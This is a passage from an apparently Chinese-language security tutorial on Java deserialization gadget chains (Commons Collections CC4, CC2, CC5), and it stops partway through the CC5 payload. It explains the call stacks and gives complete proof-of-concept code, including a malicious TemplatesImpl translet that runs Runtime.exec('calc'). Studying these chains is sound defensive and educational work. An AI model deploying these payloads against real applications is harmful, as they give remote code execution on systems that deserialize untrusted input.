-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">private void readObject(java.io.ObjectInputStream s)</span><br><span class="line">    throws java.io.IOException, ClassNotFoundException &#123;</span><br><span class="line">    // Read in size, and any hidden stuff</span><br><span class="line">    s.defaultReadObject();</span><br><span class="line"></span><br><span class="line">    // Read in (and discard) array length</span><br><span class="line">    s.readInt();</span><br><span class="line"></span><br><span class="line">    queue = new Object[size];</span><br><span class="line"></span><br><span class="line">    // Read in all elements.</span><br><span class="line">    for (int i = 0; i &lt; size; i++)</span><br><span class="line">        queue[i] = s.readObject();</span><br><span class="line"></span><br><span class="line">    // Elements are guaranteed to be in &quot;proper order&quot;, but the</span><br><span class="line">    // spec has never explained what that might be.</span><br><span class="line">    heapify();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<h3 id="调用栈总结"><a href="#调用栈总结" class="headerlink" title="调用栈总结"></a>调用栈总结</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">PriorityQueue#readObject()</span><br><span class="line">    PriorityQueue#heapify()</span><br><span class="line">        PriorityQueue#siftDown()</span><br><span class="line">            PriorityQueue#siftDownUsingComparator()</span><br><span class="line">                TransformingComparator#compare()</span><br><span class="line">                    ChainedTransformer#transform()</span><br><span class="line">                        ConstantTransformer#transform()</span><br><span class="line">                            InstantiateTransformer#transform()</span><br><span class="line">                                TrAXFilter#TrAXFilter()</span><br><span class="line">                                    TemplatesImpl#newTransformer()</span><br><span class="line">                                        TemplatesImpl#getTransletInstance()</span><br><span class="line">        									TemplatesImpl#defineTransletClasses()</span><br><span class="line">            									TransletClassLoader#defineClass()</span><br></pre></td></tr></table></figure>
-
-<h3 id="payload"><a href="#payload" class="headerlink" title="payload"></a>payload</h3><p>Eval 类：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">import com.sun.org.apache.xalan.internal.xsltc.DOM;</span><br><span class="line">import com.sun.org.apache.xalan.internal.xsltc.TransletException;</span><br><span class="line">import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;</span><br><span class="line">import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;</span><br><span class="line">import com.sun.org.apache.xml.internal.serializer.SerializationHandler;</span><br><span class="line"></span><br><span class="line">import java.io.IOException;</span><br><span class="line">import java.io.Serializable;</span><br><span class="line"></span><br><span class="line">public class Eval extends AbstractTranslet &#123;</span><br><span class="line">    // 恶意代码放在静态代码块中</span><br><span class="line">    static &#123;</span><br><span class="line">        try &#123;</span><br><span class="line">            Runtime.getRuntime().exec(&quot;calc&quot;);</span><br><span class="line">        &#125; catch (IOException e) &#123;</span><br><span class="line">            throw new RuntimeException(e);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // 需要重写父类的两个方法</span><br><span class="line">    @Override</span><br><span class="line">    public void transform(DOM document, SerializationHandler[] handlers) throws TransletException &#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    @Override</span><br><span class="line">    public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) throws TransletException &#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p>执行程序：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br></pre></td><td class="code"><pre><span class="line">import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line">import com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;</span><br><span class="line"></span><br><span class="line">import org.apache.commons.collections4.Transformer;</span><br><span class="line">import org.apache.commons.collections4.comparators.TransformingComparator;</span><br><span class="line">import org.apache.commons.collections4.functors.ChainedTransformer;</span><br><span class="line">import org.apache.commons.collections4.functors.ConstantTransformer;</span><br><span class="line">import org.apache.commons.collections4.functors.InstantiateTransformer;</span><br><span class="line"></span><br><span class="line">import javax.xml.transform.Templates;</span><br><span class="line">import java.io.ByteArrayInputStream;</span><br><span class="line">import java.io.ByteArrayOutputStream;</span><br><span class="line">import java.io.ObjectInputStream;</span><br><span class="line">import java.io.ObjectOutputStream;</span><br><span class="line">import java.lang.reflect.Field;</span><br><span class="line">import java.nio.file.Files;</span><br><span class="line">import java.nio.file.Paths;</span><br><span class="line">import java.util.PriorityQueue;</span><br><span class="line"></span><br><span class="line">public class CC4 &#123;</span><br><span class="line"></span><br><span class="line">    public static void main(String[] args) &#123;</span><br><span class="line">        try&#123;</span><br><span class="line">            // 初始化 TemplatesImpl 对象</span><br><span class="line">            TemplatesImpl templates = new TemplatesImpl();</span><br><span class="line">            // 这里需要用到恶意类的字节码文件，通过 maven 编译后 target 目录下有字节码文件</span><br><span class="line">            byte[] code = Files.readAllBytes(Paths.get(&quot;C:\\Users\\miaoj\\Documents\\Java安全代码实验\\CC2457test\\target\\classes\\com\\miaoji\\Eval.class&quot;));</span><br><span class="line">            setFieldValue(templates, &quot;_bytecodes&quot;, new byte[][]&#123;code&#125;);</span><br><span class="line">            // _name 不为空</span><br><span class="line">            setFieldValue(templates, &quot;_name&quot;, &quot;test&quot;);</span><br><span class="line"></span><br><span class="line">            // 利用 ChainedTransformer 执行 templates.newTransformer()</span><br><span class="line">            Transformer[] transformers = new Transformer[] &#123;</span><br><span class="line">                    new ConstantTransformer(TrAXFilter.class),</span><br><span class="line">                    new InstantiateTransformer(new Class[]&#123;Templates.class&#125;, new Object[]&#123;templates&#125;)</span><br><span class="line">            &#125;;</span><br><span class="line">            ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);</span><br><span class="line"></span><br><span class="line">            // 利用 TransformingComparator 执行 transform 方法</span><br><span class="line">            TransformingComparator comparator = new TransformingComparator(chainedTransformer);</span><br><span class="line"></span><br><span class="line">            // 初始化入口类 PriorityQueue</span><br><span class="line">            PriorityQueue priorityQueue = new PriorityQueue(2);</span><br><span class="line">            // 向 priorityQueue 中添加元素，使得元素个数 size 增加</span><br><span class="line">            priorityQueue.add(1);</span><br><span class="line">            priorityQueue.add(1);</span><br><span class="line"></span><br><span class="line">            // 在 add 调用完之后，再反射修改 comparator 属性为 TransformingComparator 对象</span><br><span class="line">            Object[] objects = new Object[]&#123;templates, null&#125;;</span><br><span class="line">            setFieldValue(priorityQueue, &quot;comparator&quot;, comparator);</span><br><span class="line"></span><br><span class="line">            // 序列化成字节数组</span><br><span class="line">            ByteArrayOutputStream baos = new ByteArrayOutputStream();</span><br><span class="line">            ObjectOutputStream oos = new ObjectOutputStream(baos);</span><br><span class="line">            oos.writeObject(priorityQueue);</span><br><span class="line">            oos.flush();</span><br><span class="line">            oos.close();</span><br><span class="line"></span><br><span class="line">            // 反序列化字节数组</span><br><span class="line">            ByteArrayInputStream bais = new ByteArrayInputStream(baos.toByteArray());</span><br><span class="line">            ObjectInputStream ois = new ObjectInputStream(bais);</span><br><span class="line">            ois.readObject();</span><br><span class="line">            ois.close();</span><br><span class="line"></span><br><span class="line">        &#125; catch (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    //反射设置 Field</span><br><span class="line">    public static void setFieldValue(Object object, String fieldName, Object value) &#123;</span><br><span class="line">        try &#123;</span><br><span class="line">            Field field = object.getClass().getDeclaredField(fieldName);</span><br><span class="line">            field.setAccessible(true);</span><br><span class="line">            field.set(object, value);</span><br><span class="line">        &#125; catch (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p>这里需要再说明一下，为什么不在构造方法中将 PriorityQueue 的 comparator 属性为 TransformingComparator 对象呢？因为 add 方法会提前调用 comparator.compare() ，造成序列化时命令执行，具体调用如下：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">PriorityQueue#add() </span><br><span class="line"></span><br><span class="line">-&gt; PriorityQueue#offer() </span><br><span class="line"></span><br><span class="line">-&gt; PriorityQueue#siftUp() </span><br><span class="line"></span><br><span class="line">-&gt; PriorityQueue#siftUpUsingComparator() </span><br><span class="line"></span><br><span class="line">-&gt; PriorityQueue.comparator#compare()</span><br></pre></td></tr></table></figure>
-
-<p>所以 payload 是在 add 方法调用完后再将 comparator 属性赋值。</p>
-<h2 id="CC2-链"><a href="#CC2-链" class="headerlink" title="CC2 链"></a>CC2 链</h2><p>CC2 链与 CC4 链的相同之处在于它们都将 PriorityQueue 作为入口类，利用 TransformingComparator#compare() 来调用 transform 方法。不同之处在于 CC2 链用 InvokerTransformer 代替 TrAXFilter + InstantiateTransformer 来执行 TemplatesImpl#newTransformer() </p>
-<h3 id="调用栈总结-1"><a href="#调用栈总结-1" class="headerlink" title="调用栈总结"></a>调用栈总结</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">PriorityQueue#readObject()</span><br><span class="line">    PriorityQueue#heapify()</span><br><span class="line">        PriorityQueue#siftDown()</span><br><span class="line">            PriorityQueue#siftDownUsingComparator()</span><br><span class="line">                TransformingComparator#compare()</span><br><span class="line">                    ChainedTransformer#transform()</span><br><span class="line">                        ConstantTransformer#transform()</span><br><span class="line">                            InvokerTransformer#transform()</span><br><span class="line">                                TemplatesImpl#newTransformer()</span><br><span class="line">                                    TemplatesImpl#getTransletInstance()</span><br><span class="line">        								TemplatesImpl#defineTransletClasses()</span><br><span class="line">            								TransletClassLoader#defineClass()</span><br></pre></td></tr></table></figure>
-
-<h3 id="payload-1"><a href="#payload-1" class="headerlink" title="payload"></a>payload</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br></pre></td><td class="code"><pre><span class="line">import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"></span><br><span class="line">import org.apache.commons.collections4.Transformer;</span><br><span class="line">import org.apache.commons.collections4.comparators.TransformingComparator;</span><br><span class="line">import org.apache.commons.collections4.functors.ChainedTransformer;</span><br><span class="line">import org.apache.commons.collections4.functors.ConstantTransformer;</span><br><span class="line">import org.apache.commons.collections4.functors.InvokerTransformer;</span><br><span class="line"></span><br><span class="line">import java.io.ByteArrayInputStream;</span><br><span class="line">import java.io.ByteArrayOutputStream;</span><br><span class="line">import java.io.ObjectInputStream;</span><br><span class="line">import java.io.ObjectOutputStream;</span><br><span class="line">import java.lang.reflect.Field;</span><br><span class="line">import java.nio.file.Files;</span><br><span class="line">import java.nio.file.Paths;</span><br><span class="line">import java.util.PriorityQueue;</span><br><span class="line"></span><br><span class="line">public class CC2 &#123;</span><br><span class="line">    public static void main(String[] args) &#123;</span><br><span class="line">        try&#123;</span><br><span class="line">            // 初始化 TemplatesImpl 对象</span><br><span class="line">            TemplatesImpl templates = new TemplatesImpl();</span><br><span class="line">            // 这里需要用到恶意类的字节码文件，通过 maven 编译后 target 目录下有字节码文件</span><br><span class="line">            byte[] code = Files.readAllBytes(Paths.get(&quot;C:\\Users\\miaoj\\Documents\\Java安全代码实验\\CC2457test\\target\\classes\\com\\miaoji\\Eval.class&quot;));</span><br><span class="line">            setFieldValue(templates, &quot;_bytecodes&quot;, new byte[][]&#123;code&#125;);</span><br><span class="line">            // _name 不为空</span><br><span class="line">            setFieldValue(templates, &quot;_name&quot;, &quot;test&quot;);</span><br><span class="line"></span><br><span class="line">            // 利用 ChainedTransformer 执行 templates.newTransformer()</span><br><span class="line">            Transformer[] transformers = new Transformer[] &#123;</span><br><span class="line">                    new ConstantTransformer(templates),</span><br><span class="line">                    new InvokerTransformer(&quot;newTransformer&quot;, null,null)</span><br><span class="line">            &#125;;</span><br><span class="line">            ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);</span><br><span class="line"></span><br><span class="line">            // 利用 TransformingComparator 执行 transform 方法</span><br><span class="line">            TransformingComparator comparator = new TransformingComparator(chainedTransformer);</span><br><span class="line"></span><br><span class="line">            // 初始化入口类 PriorityQueue</span><br><span class="line">            PriorityQueue priorityQueue = new PriorityQueue(2);</span><br><span class="line">            // 向 priorityQueue 中添加元素，使得元素个数 size 增加</span><br><span class="line">            priorityQueue.add(1);</span><br><span class="line">            priorityQueue.add(1);</span><br><span class="line"></span><br><span class="line">            // 在 add 调用完之后，再反射修改 comparator 属性为 TransformingComparator 对象</span><br><span class="line">            Object[] objects = new Object[]&#123;templates, null&#125;;</span><br><span class="line">            setFieldValue(priorityQueue, &quot;comparator&quot;, comparator);</span><br><span class="line"></span><br><span class="line">            // 序列化成字节数组</span><br><span class="line">            ByteArrayOutputStream baos = new ByteArrayOutputStream();</span><br><span class="line">            ObjectOutputStream oos = new ObjectOutputStream(baos);</span><br><span class="line">            oos.writeObject(priorityQueue);</span><br><span class="line">            oos.flush();</span><br><span class="line">            oos.close();</span><br><span class="line"></span><br><span class="line">            // 反序列化字节数组</span><br><span class="line">            ByteArrayInputStream bais = new ByteArrayInputStream(baos.toByteArray());</span><br><span class="line">            ObjectInputStream ois = new ObjectInputStream(bais);</span><br><span class="line">            ois.readObject();</span><br><span class="line">            ois.close();</span><br><span class="line"></span><br><span class="line">        &#125; catch (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    //反射设置 Field</span><br><span class="line">    public static void setFieldValue(Object object, String fieldName, Object value) &#123;</span><br><span class="line">        try &#123;</span><br><span class="line">            Field field = object.getClass().getDeclaredField(fieldName);</span><br><span class="line">            field.setAccessible(true);</span><br><span class="line">            field.set(object, value);</span><br><span class="line">        &#125; catch (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-
-
-<h2 id="CC5-链"><a href="#CC5-链" class="headerlink" title="CC5 链"></a>CC5 链</h2><p>CC5 链将 BadAttributeValueExpException#readObject() 作为入口，利用 TiedMapEntry#tostring() 来调用 LazyMap#get() ，进而调用 transform 方法。</p>
-<p><strong>实验环境</strong> </p>
-<ul>
-<li>java &#x3D; 8u65</li>
-<li>CommonsCollections &#x3D; 3.2.1</li>
-</ul>
-<p>pom.xml 中导入如下依赖：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;dependency&gt;</span><br><span class="line">    &lt;groupId&gt;commons-collections&lt;/groupId&gt;</span><br><span class="line">    &lt;artifactId&gt;commons-collections&lt;/artifactId&gt;</span><br><span class="line">    &lt;version&gt;3.2.1&lt;/version&gt;</span><br><span class="line">&lt;/dependency&gt;</span><br></pre></td></tr></table></figure>
-
-<h3 id="利用链之-TiedMapEntry"><a href="#利用链之-TiedMapEntry" class="headerlink" title="利用链之 TiedMapEntry"></a>利用链之 TiedMapEntry</h3><p>前面在使用 TiedMapEntry 时，用的是它的 getValue 方法来调用其成员属性 map 的 get 方法：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">public Object getValue() &#123;</span><br><span class="line">    return map.get(key);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p>TiedMapEntry 的 toString 方法又调用了 getValue 方法：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">public String toString() &#123;</span><br><span class="line">    return getKey() + &quot;=&quot; + getValue();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<h3 id="入口类之-BadAttributeValueExpException"><a href="#入口类之-BadAttributeValueExpException" class="headerlink" title="入口类之 BadAttributeValueExpException"></a>入口类之 BadAttributeValueExpException</h3><p>BadAttributeValueExpException 的 readObject 方法调用了 valObj 的 toString 方法：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">private void readObject(ObjectInputStream ois) throws IOException, ClassNotFoundException &#123;</span><br><span class="line">    ObjectInputStream.GetField gf = ois.readFields();</span><br><span class="line">    Object valObj = gf.get(&quot;val&quot;, null);</span><br><span class="line"></span><br><span class="line">    if (valObj == null) &#123;</span><br><span class="line">        val = null;</span><br><span class="line">    &#125; else if (valObj instanceof String) &#123;</span><br><span class="line">        val= valObj;</span><br><span class="line">    &#125; else if (System.getSecurityManager() == null</span><br><span class="line">            || valObj instanceof Long</span><br><span class="line">            || valObj instanceof Integer</span><br><span class="line">            || valObj instanceof Float</span><br><span class="line">            || valObj instanceof Double</span><br><span class="line">            || valObj instanceof Byte</span><br><span class="line">            || valObj instanceof Short</span><br><span class="line">            || valObj instanceof Boolean) &#123;</span><br><span class="line">        val = valObj.toString();</span><br><span class="line">    &#125; else &#123; // the serialized object is from a version without JDK-8019292 fix</span><br><span class="line">        val = System.identityHashCode(valObj) + &quot;@&quot; + valObj.getClass().getName();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p>我们看看 valObj 是怎么来的：</p>
-<p><code>ObjectInputStream.GetField gf = ois.readFields();</code> </p>
-<ul>
-<li>ois：一个 ObjectInputStream 实例，用于从输入流中读取对象。</li>
-<li>readFields()：读取对象的字段，并返回一个 ObjectInputStream.GetField 对象，这个对象包含了序列化对象的字段和值。</li>
-</ul>
-<p><code>Object valObj = gf.get(&quot;val&quot;, null);</code> </p>
-<ul>
-<li>gf：前面获取的 ObjectInputStream.GetField 对象。</li>
-<li>get(“val”, null)：从 gf 中获取名为 val 的字段值。如果 val 字段不存在，则返回 null。</li>
-</ul>
-<p>所以说，valObj 的值就是 val 的值，而 val 是 BadAttributeValueExpException 中定义的属性：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">private Object val;</span><br></pre></td></tr></table></figure>
-
-<p>所以我们只需要将 val 赋值成 TiedMapEntry 对象即可。</p>
-<p>但是我们并不能用构造方法赋值，因为构造方法会提前调用 val 的 toString 方法，造成命令执行：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">public BadAttributeValueExpException (Object val) &#123;</span><br><span class="line">    this.val = val == null ? null : val.toString();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p>所以这里选择反射修改 val 的值。</p>
-<p>再来看判断，调用 valObj.toString() 的前提是：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">System.getSecurityManager() == null</span><br><span class="line">            || valObj instanceof Long</span><br><span class="line">            || valObj instanceof Integer</span><br><span class="line">            || valObj instanceof Float</span><br><span class="line">            || valObj instanceof Double</span><br><span class="line">            || valObj instanceof Byte</span><br><span class="line">            || valObj instanceof Short</span><br><span class="line">            || valObj instanceof Boolean</span><br></pre></td></tr></table></figure>
-
-<p>这个式子返回 true 。若 valObj 为 TiedMapEntry 对象，则所有的 instanceof 判断均为 false 。System.getSecurityManager() 作用是获取当前 Java 虚拟机 (JVM) 安装的 SecurityManager（ Java 中的一种安全机制，用于在运行时对代码进行安全检查），默认情况下是没有安装的，所以返回 null ，那么上述判断默认情况下为 true 。</p>
-<p>当然也就可以知道：理论上，如果受害者安装了 SecurityManager ，CC5 链就行不通。</p>
-<h3 id="调用栈总结-2"><a href="#调用栈总结-2" class="headerlink" title="调用栈总结"></a>调用栈总结</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">BadAttributeValueExpException#readObject()</span><br><span class="line">    TiedMapEntry#toString()</span><br><span class="line">        TiedMapEntry#getValue()</span><br><span class="line">            LazyMap#get()</span><br><span class="line">                ChainedTransformer#transform()</span><br><span class="line">                    ConstantTransformer#transform()</span><br><span class="line">                        InvokerTransformer#transform()</span><br><span class="line">                        	Runtime#exec()</span><br></pre></td></tr></table></figure>
-
-<h3 id="payload-2"><a href="#payload-2" class="headerlink" title="payload"></a>payload</h3><p>CC5 链还是采用 InvokerTransformer 命令执行的办法。</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line">import org.apache.commons.collections.Transformer;</span><br><span class="line">import org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line">import org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line">import org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line">import org.apache.commons.collections.keyvalue.TiedMapEntry;</span><br><span class="line">import org.apache.commons.collections.map.LazyMap;</span><br><span class="line"></span><br><span class="line">import javax.management.BadAttributeValueExpException;</span><br><span class="line">import java.io.*;</span><br><span class="line">import java.lang.reflect.Field;</span><br><span class="line">import java.util.HashMap;</span><br><span class="line">import java.util.Map;</span><br><span class="line"></span><br><span class="line">public class CC5 &#123;</span><br><span class="line">    public static void main(String[] args) throws Exception &#123;</span><br><span class="line"></span><br><span class="line">        // 利用 ChainedTransformer 执行 Runtime.getRuntime.exec(&quot;calc&quot;)</span><br><span class="line">        Transformer[] transformers = new Transformer[] &#123;</span><br><span class="line">                new ConstantTransformer(Runtime.class),</span><br><span class="line">                new InvokerTransformer(&quot;getMethod&quot;, new Class[]&#123;String.class, Class[].class&#125;, new Object[]&#123;&quot;getRuntime&quot;, new Class[0]&#125;),</span><br><span class="line">                new InvokerTransformer(&quot;invoke&quot;, new Class[]&#123;Object.class, Object[].class&#125;, new Object[]&#123;null, new Object[0]&#125;),</span><br><span class="line">                new InvokerTransformer(&quot;exec&quot;, new Class[]&#123;String.class&#125;, new Object[]&#123;&quot;calc&quot;&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line">        Transformer chainedTransformer = new ChainedTransformer(transformers);</span><br><span class="line"></span><br><span class="line">        // 利用 LazyMap 的 get 方法执行 ChainedTransformer 的 transform 方法</span><br><span class="line">        Map uselessMap = new HashMap();</span><br><span class="line">        Map lazyMap = LazyMap.decorate(uselessMap,chainedTransformer);</span><br><span class="line"></span><br><span class="line">        // 利用 TiedMapEntry 的 toString 